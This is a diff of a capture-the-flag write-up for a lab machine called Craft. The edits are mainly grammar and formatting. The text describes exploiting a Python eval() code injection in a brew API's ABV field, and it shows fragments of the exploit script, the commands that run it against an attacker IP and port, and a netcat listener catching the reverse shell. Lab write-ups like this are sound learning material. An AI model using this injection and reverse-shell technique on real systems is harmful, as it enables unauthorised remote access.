@@ -157,7 +157,7 @@ Now the value gets passed first to **eval()** to evaluate the value first.
                 create_brew(request.json)
                 return None, 201
 
-That's **python code injection** vulnerability. I can pass values to **eval()** through **ABV**.
+That's a **python code injection** vulnerability. I can pass values to **eval()** through **ABV**.
 
 In latest commit, I found a script **test.py** that checks if **abv** issue has been solved or not.
 
@@ -248,13 +248,15 @@ So, I'll use **test.py** and edit it a little bit.
     json_data = json.dumps(brew_dict)
     response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
     print(response.text)
-```
+
+Running it
+
     root@kali:# python3 craft-api-exploit.py
     Usage: craft-api-exploit.py IP PORT
     root@kali:# python3 craft-api-exploit.py 10.10.15.38 9001
-```
 
-And i got my shell back
+
+And I got my shell back
 
     root@kali:# nc -lvnp 9001
     Ncat: Version 7.80 ( https://nmap.org/ncat )
